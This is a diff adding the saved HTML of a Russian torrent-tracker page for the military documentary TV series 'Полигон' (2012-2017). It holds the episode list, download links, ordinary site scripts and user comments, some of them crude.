@@ -1,0 +1,459 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Полигон [01-73] (2012-2017) SATRip от MediaClub &amp; Generalfilm</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Полигон [01-73] (2012-2017) SATRip от MediaClub &amp; Generalfilm</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:14da2dc52348ba80cf94a647f72fa0849be566c7&amp;dn=rutor.info_%D0%9F%D0%BE%D0%BB%D0%B8%D0%B3%D0%BE%D0%BD+%5B01-73%5D+%282012-2017%29+SATRip+%D0%BE%D1%82+MediaClub+%26+Generalfilm&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=309352"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/309352"><img src="http://s.rutor.info/t/down.png"> Скачать Poligon.SATRip.MediaClub.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://s018.radikal.ru/i503/1602/dc/b6f573572f9a.jpg" /><br />
+<br />
+<b>Оригинальное название:</b> Полигон<br />
+<b>Год выпуска:</b> 2012-2017<br />
+<b>Жанр:</b>  <a href="/tag/6/Документальный" target="_blank">Документальный</a>, <a href="/tag/6/военный" target="_blank">военный</a><br />
+<b>Выпущено:</b> Россия, ООО &quot;Единая медиа группа&quot;<br />
+<b>Ведущий:</b> Иван Лебедев, Дмитрий Задорожный, Алексей Громыко<br />
+<br />
+<b>О фильме:</b> Одна из самых ожидаемых премьер этого телесезона - программа о современных военных разработках, новейших видах вооружения, средствах ведения боя и индивидуальной защиты! Российская армия сегодня – это не только автомат Калашникова и самолеты Сухого. Инновационные разработки военно-промышленного комплекса открывают практически безграничные возможности. Однако гражданским лицам о них известно крайне мало. Чтобы восполнить этот пробел, ведущие телеканала &quot;Россия 2&quot; Иван Лебедев и Дмитрий Задорожный отправляются на настоящие военные полигоны. В &quot;боевых условиях&quot; они попытаются выяснить, как устроены и работают современные бронеавтомобили и снайперские винтовки, ударные вертолеты и боевые корабли. С любознательностью новобранцев они будут рассматривать каждый винтик и интересоваться его предназначением, а также проводить тест-драйвы, ставить рискованные опыты и бесшабашные эксперименты. В этой программе не будет кирзовых сапог и строевой подготовки. Зато будет все то, о чем каждый настоящий мужчина мечтает с раннего детства – много оружия и грозной военной техники.<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Содержание</div><div class="hidebody"></div><textarea class="hidearea"><br />
+1. Универсальный солдат<br />
+2. Терминатор<br />
+3. Прорыв<br />
+4. Оружие снайпера<br />
+5. Десантура<br />
+6. Мост за час<br />
+7. Боевые вертолёты<br />
+8. Дикая кошка<br />
+9. Неуловимый мститель<br />
+10. Крупный калибр<br />
+11. Корд<br />
+12. Ключ к небу<br />
+13. Возвращение легенды<br />
+14. База 201<br />
+15. Боевая авиация<br />
+16. &quot;ОКНО&quot;<br />
+17. Панцирь<br />
+18. Воздушный бой<br />
+19. Спасение подводной лодки<br />
+20. Большие пушки<br />
+21. Путешествие на глубину (1 часть)<br />
+22. Путешествие на глубину (2 часть)<br />
+23. РХБЗ<br />
+24. Разведка<br />
+25. Авианосец<br />
+26. Саперы<br />
+27. Тяжелый десант<br />
+28. Артиллерия Балтики<br />
+29. Зубр<br />
+30. Оружие победы<br />
+31. БМП-3. (часть 1)<br />
+32. БМП-3. (часть 2)<br />
+33. Спрут<br />
+34. Эшелон<br />
+35. Ангара. Часть 1<br />
+36. Ангара. Часть 2<br />
+37. Пулеметы<br />
+38. Дневники танкиста. Часть 1<br />
+39. Дневники танкиста. Часть 2<br />
+40. Дневники танкиста. Часть 3<br />
+41. Самоходное орудие &quot;Нона&quot;<br />
+42. Мины<br />
+43. Огнеметы<br />
+44. Тор. Рождение<br />
+45. Тор. Испытание<br />
+46. Ту-95. Медведь<br />
+47.Танк Победы<br />
+48. Танк Т-80У<br />
+49. Спецбоеприпасы<br />
+50. Стратеги<br />
+51. Минная война<br />
+52. Переправа<br />
+53. Морпехи<br />
+54. Танк Т-72БЗ<br />
+55. Корветы (1 часть)<br />
+56. Корветы (2 часть)<br />
+57. Большой десантный корабль<br />
+58. Гаубица Д-30<br />
+59. Разминирование<br />
+60.  БПК. Североморск<br />
+61.  Ка-27<br />
+62. Операция Шторм. Часть 1<br />
+63. Операция Шторм. Часть 2<br />
+64. Операция Шторм. Часть 3<br />
+65. ТАРКР. Петр Великий<br />
+66. Операция Шторм. Часть 4<br />
+67. Андреевский флаг. Фильм 1<br />
+68. Андреевский флаг. Фильм 2<br />
+69. Андреевский флаг. Возвращение<br />
+70. Начало<br />
+71. Проверено на себе<br />
+72. Избранное<br />
+73. Штурмовики<br />
+</textarea></div><br />
+ <br />
+<b>Качество:</b> SATRip<br />
+<b>Видео:</b> XviD, ~ 1797 Кбит/с, 704x400<br />
+<b>Аудио:</b> MP3, 2 ch, 128 Кбит/с<br />
+<b>Продолжительность:</b> 73 х ~ 00:27:00<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://sendpic.org/view/2/i/xUlUDgb7SmBgyPEJWiPUbutftlB.png" target="_blank"><img src="http://i2.sendpic.org/t/3x/3xyQQMGGFA6RKuNkkGNpuMFfalx.jpg" /></a> <a href="http://sendpic.org/view/1/i/12rRXwVPWhuWq9Ksgckrqlp7IFl.png" target="_blank"><img src="http://i1.sendpic.org/t/4B/4BHbZq7bZVot4kxvnVZ5jADVli.jpg" /></a><br />
+<a href="http://sendpic.org/view/2/i/dCdVt1jR0LrZ1QneMrG5VCFz6Vd.png" target="_blank"><img src="http://i2.sendpic.org/t/jD/jDst9yy0ncX2cCawNLKo1maRQT0.jpg" /></a> <a href="http://sendpic.org/view/2/i/duOvDCyvhDSMkchXQIggz34lt2M.png" target="_blank"><img src="http://i2.sendpic.org/t/iw/iwVxF85Sxh9cxqtkkq6KnqMbdDw.jpg" /></a><br />
+<a href="http://sendpic.org/view/2/i/mRaxZ5xKEQakNlEghhKmWCD3HJR.png" target="_blank"><img src="http://i2.sendpic.org/t/sI/sITQVqi3992nZNcmKlxRS6yb7Ij.jpg" /></a> <a href="http://sendpic.org/view/1/i/dti3hZybgNrrQxsNKpJ4nZ7PnKT.png" target="_blank"><img src="http://i1.sendpic.org/t/xi/xiR5mXJWZvJefuxvMig4zAYrhQz.jpg" /></a><br />
+</textarea></div><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Внимание</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<b>Раздача ведётся путём добавления новых серий; при каждом добавлении создаётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:</b><br />
+<br />
+- Остановить скачивание.<br />
+- Удалить старый торрент у себя из клиента (старые серии удалять не надо).<br />
+- Скачать новый торрент и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку куда и должно происходить скачивание новых серий.<br />
+<br />
+Ваш клиент при этом должен произвести хеширование (проверку) старой папки (если не производит сам - помогите ему сделать это), и будет докачивать только те серии которых у вас ещё нет. Старые серии при этом не удаляются, а продолжают раздаваться!<br />
+Если вы уже удалили старые серии, то предотвратить повторную закачку старых серий можно, отжав галочку в соответствующих местах при запуске нового торрента. По возможности, желательно не удалять старые серии как можно дольше, чтобы релизер не столько продолжал раздавать старые серии, а смог сконцентрироваться на новых.<br />
+</textarea></div><br />
+<b>Релиз: </b> <a href="http://generalfilm.org" target="_blank"><img src="http://s019.radikal.ru/i603/1209/87/535dfd778010.gif" /></a> <img src="http://s020.radikal.ru/i712/1704/ba/76f902ab90dd.gif" /><br />
+<br />
+Огромная благодарность Media-Art-Club за созданный постер к раздаче</td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/875231/0" target="_blank">olegka7373</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>9.4 из 10 (14 голосов, самая низкая оценка - 1, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/tv" target="_blank">Телевизор</a></td></tr>
+<tr><td class="header">Раздают</td><td>2</td></tr>
+<tr><td class="header">Качают</td><td>1</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 5:19:06 (43 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 13:55:37  (16 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>26.33&nbsp;GB  (28271536724 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 309352);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>07&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/501750"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c2d314c6d085377922c543a5598342ef0bbff6cc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/501750/poligon-01-73-2012-2017-hdtvrip-ot-generalfilm">Полигон [01-73] (2012-2017) HDTVRip от GeneralFilm </a></td> 
+<td align="right">22.60&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/6/0/0/Полигон" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/309352.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (73)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=309352">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(309352);">Промодерировать раздачу</span> | <span onclick="confirm_delete(309352);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/309352">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>olegka7373</b></td> <td>02-08-2017 12:12:24 (9 месяцев назад)</td> <td></td> <td align="right"><span id="c_3036440"></span><script type="text/javascript">cOptions(875231,3036440);</script></td></tr><tr><td class="c_t" colspan=4>Добавил <b>Избранное</b><br />
+<br />
+Добавил 3 фильма Андреевский флаг<br />
+<br />
+<br />
+<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Cra@zzyFox</b></td> <td>17-05-2017 10:36:56 (12 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2996120"></span><script type="text/javascript">cOptions(1214746,2996120);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо! <img src="http://s.rutor.info/t/smilies/spasibo.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>02-05-2017 17:39:40 (12 месяца назад)</td> <td></td> <td align="right"><span id="c_2987411"></span><script type="text/javascript">cOptions(875231,2987411);</script></td></tr><tr><td class="c_t" colspan=4>Добавил:  БПК. Североморск, Ка-27, Операция Шторм. Части 1-3, ТАРКР. Петр Великий</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>vova pukin</b></td> <td>02-07-2016 14:18:24 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2791092"></span><script type="text/javascript">cOptions(1235008,2791092);</script></td></tr><tr><td class="c_t" colspan=4>Тематика интересна, а вот подача отвратительна (клоуны ёпт) Передачи по ТВ КАНАЛАМ; ОРТ,ЗВЕЗДЕ и ОРУЖИЕ,ЭТ ДААА....Релизёру всё же 10 Смотреть не буду тк скоморошество ведущего весьма раздражает  </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Sooll3</b></td> <td>03-05-2016 6:39:33 (25 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2756456"></span><script type="text/javascript">cOptions(1341380,2756456);</script></td></tr><tr><td class="c_t" colspan=4>Механикус<br />
+Хе-хе - ему до серийной серии еще десятилетия! И стоимость - миллионы долларов! И к примеру, наша Гаубица Д 30 - такие &quot; Прототипы&quot; пачками ложить будет и стоит сущие копейки)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Механикус</b></td> <td>24-02-2016 21:23:41 (27 месяцев назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_2709943"></span><script type="text/javascript">cOptions(1440127,2709943);</script></td></tr><tr><td class="c_t" colspan=4>Америкосы уже протоТерминаторов клепают https://www.youtube.com/watch?v=rVlhMGQgDkY ,а вы все меряетесь пиписьками-вот у нас самый большой миномет да самолет,да древняя гаубица д-30.Сериальчик исключительно для квасных патриотов и иже с ними.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>20-02-2016 13:05:35 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2706647"></span><script type="text/javascript">cOptions(875231,2706647);</script></td></tr><tr><td class="c_t" colspan=4>Добавил <b>Большой десантный корабль и Гаубица Д-30</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>1988human2015</b></td> <td>19-02-2016 13:25:29 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2705913"></span><script type="text/javascript">cOptions(1441572,2705913);</script></td></tr><tr><td class="c_t" colspan=4>в тяжкие времена войны на Донбассе 2014-2015 появление раздачи сего познавательного цикла передач выглядит, по крайней мере, с моей субъективной т.зрения, провокативным:(</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>19-02-2016 8:02:18 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2705759"></span><script type="text/javascript">cOptions(875231,2705759);</script></td></tr><tr><td class="c_t" colspan=4>Добавил фильмы <b>Минная война, Переправа, Морпехи, Танк Т-72БЗ, Корветы (1-2 части)</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>boober201520151975</b></td> <td>26-03-2015 11:54:18 (38 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2416735"></span><script type="text/javascript">cOptions(1203347,2416735);</script></td></tr><tr><td class="c_t" colspan=4>thankyou<img src="http://s.rutor.info/t/smilies/thumbsup1.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>11-03-2015 16:50:48 (38 месяцев назад)</td> <td></td> <td align="right"><span id="c_2400363"></span><script type="text/javascript">cOptions(875231,2400363);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавил фильм Стратеги</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>R.O.T.O.R</b></td> <td>28-02-2015 23:42:08 (39 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2388662"></span><script type="text/javascript">cOptions(122521,2388662);</script></td></tr><tr><td class="c_t" colspan=4>Большое Спасибо что поддерживаете эту серию передач!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>28-02-2015 3:32:23 (39 месяцев назад)</td> <td></td> <td align="right"><span id="c_2387738"></span><script type="text/javascript">cOptions(875231,2387738);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавил Спецбоеприпасы</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Oster1987</b></td> <td>02-02-2015 22:23:26 (40 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2361731"></span><script type="text/javascript">cOptions(857827,2361731);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо, очень интересно!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sibull</b></td> <td>06-12-2014 19:09:29 (42 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2303535"></span><script type="text/javascript">cOptions(302049,2303535);</script></td></tr><tr><td class="c_t" colspan=4>Большое спасибо. Посмотрел последний выпуск про ТОР, но не понял, почему комплекс установлен на шасси (тягач, автомобиль, не знаю, как правильно сказать) ТАТА индийского производства, да еще с правым рулем. У нас своей подобной техники нет или таким образом индусам помогаем? В чем причина?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>amphibolin</b></td> <td>23-11-2014 22:17:47 (42 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2291709"></span><script type="text/javascript">cOptions(285018,2291709);</script></td></tr><tr><td class="c_t" colspan=4>олежка гранд мерси</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>23-11-2014 19:24:30 (42 месяца назад)</td> <td></td> <td align="right"><span id="c_2291535"></span><script type="text/javascript">cOptions(875231,2291535);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />siltums			<br />
+А когда ждать продолжения?<br />
+</fieldset><br />
+<br />
+<b>Добавил Огнеметы</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>siltums</b></td> <td>23-11-2014 11:26:21 (42 месяца назад)</td> <td></td> <td align="right"><span id="c_2291049"></span><script type="text/javascript">cOptions(483718,2291049);</script></td></tr><tr><td class="c_t" colspan=4>А когда ждать продолжения?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pupkin dermidon</b></td> <td>18-11-2014 12:26:17 (42 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2285756"></span><script type="text/javascript">cOptions(1198258,2285756);</script></td></tr><tr><td class="c_t" colspan=4>Отличная раздача !!! спс залившему ! ждем продолжения !</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>NeoWIZARD</b></td> <td>12-11-2014 19:43:00 (42 месяца назад)</td> <td></td> <td align="right"><span id="c_2278463"></span><script type="text/javascript">cOptions(264931,2278463);</script></td></tr><tr><td class="c_t" colspan=4>СПС</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Preacher_I</b></td> <td>09-11-2014 14:05:36 (43 месяца назад)</td> <td></td> <td align="right"><span id="c_2274953"></span><script type="text/javascript">cOptions(1200442,2274953);</script></td></tr><tr><td class="c_t" colspan=4>Спс....</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>VOLODЯ</b></td> <td>27-10-2014 10:36:10 (43 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2262643"></span><script type="text/javascript">cOptions(224233,2262643);</script></td></tr><tr><td class="c_t" colspan=4>Дневники танкиста понравились<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Т-90 все-таки сила</div><div class="hidebody"></div><textarea class="hidearea"><img src="http://firepic.org/images/2014-10/27/o6kjc9otd4f8.jpg" /></textarea></div> Спасибо <b>olegka7373</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>07-09-2014 19:20:58 (45 месяцев назад)</td> <td></td> <td align="right"><span id="c_2224329"></span><script type="text/javascript">cOptions(875231,2224329);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавил фильм Эшелон</b><br />
+<br />
+<b>Добавил фильм Спрут</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>siltums</b></td> <td>01-09-2014 20:06:17 (45 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2219896"></span><script type="text/javascript">cOptions(483718,2219896);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Добавил фильм БМП-3. (часть 2)<br />
+<br />
+Добавлен фильм Зубр<br />
+<br />
+Добавлены фильмы Тяжелый десант и Артиллерия Балтики<br />
+<br />
+Добавил фильм Саперы всем приятного просмотра</fieldset><br />
+<br />
+Огромное спасибо! Хотелось бы знать, еще что интересного будет? Заранее спасибо.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>01-12-2013 6:34:43 (54 месяца назад)</td> <td></td> <td align="right"><span id="c_2023316"></span><script type="text/javascript">cOptions(875231,2023316);</script></td></tr><tr><td class="c_t" colspan=4>Добавил фильм БМП-3. (часть 2) <br />
+<br />
+Добавлен фильм Зубр<br />
+<br />
+Добавлены фильмы Тяжелый десант и Артиллерия Балтики<br />
+<br />
+Добавил фильм <b>Саперы</b> всем приятного просмотра</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Zorex2013</b></td> <td>30-11-2013 5:36:45 (54 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2022536"></span><script type="text/javascript">cOptions(972115,2022536);</script></td></tr><tr><td class="c_t" colspan=4>SergUUX, молча завидуй. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>29-11-2013 5:54:15 (54 месяца назад)</td> <td></td> <td align="right"><span id="c_2021771"></span><script type="text/javascript">cOptions(875231,2021771);</script></td></tr><tr><td class="c_t" colspan=4>Добавил фильм <b>Авианосец</b> всем приятного просмотра</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>guzja</b></td> <td>14-11-2013 2:56:20 (55 месяцев назад)</td> <td></td> <td align="right"><span id="c_2006838"></span><script type="text/javascript">cOptions(7715,2006838);</script></td></tr><tr><td class="c_t" colspan=4>Туповатые ведущие.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>olegka7373</b></td> <td>07-11-2013 13:55:55 (55 месяцев назад)</td> <td></td> <td align="right"><span id="c_2000285"></span><script type="text/javascript">cOptions(875231,2000285);</script></td></tr><tr><td class="c_t" colspan=4>Добавил фильмы РХБЗ и Разведка всем приятного просмотра</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>provokator91</b></td> <td>17-10-2013 19:51:50 (55 месяцев назад)</td> <td></td> <td align="right"><span id="c_1979478"></span><script type="text/javascript">cOptions(324279,1979478);</script></td></tr><tr><td class="c_t" colspan=4>к-н Савельев пид**ас, как и старлей Сергеенков с 17 выпуска<br />
+&quot;посчастливилось&quot; мне служить с уродами этими<br />
+в гробу я эти панцири видел<br />
+P.S. и на Камазе этом 100 км/ч ехать, обосраться можно<br />
